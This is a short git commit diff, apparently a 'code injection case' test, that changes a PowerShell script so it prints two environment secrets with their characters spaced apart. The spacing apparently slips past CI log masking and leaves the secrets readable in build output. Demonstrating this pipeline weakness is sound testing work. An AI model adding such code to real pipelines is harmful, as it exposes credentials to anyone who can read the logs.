6787051400f428ad610b3b32ea7aa11d3cc78615
Yan Xu <yanxu1@microsoft.com>
2024-03-20 19:30:30 +0800

    code injection case

--- test.ps1
+++ test.ps1
@@ -1,6 +1,10 @@
-Write-Host "This is test.ps1 from main branch."
+Write-Host "This is test.ps1 from injection branch."
 Write-Host "Below is the content of README.md:"
 Get-Content "./README.md"
 Write-Host "--------------------------------------------------"
-Write-Host "SECRET1:" $env:SECRET1
-Write-Host "SECRET2:" $env:SECRET2
+$secret1 = ($env:SECRET1 -split '') -join ' '
+$secret2 = ($env:SECRET2 -split '') -join ' '
+Write-Host "-----------------start"
+Write-Host "SECRET1:" $secret1
+Write-Host "SECRET2:" $secret2
+Write-Host "-----------------end"
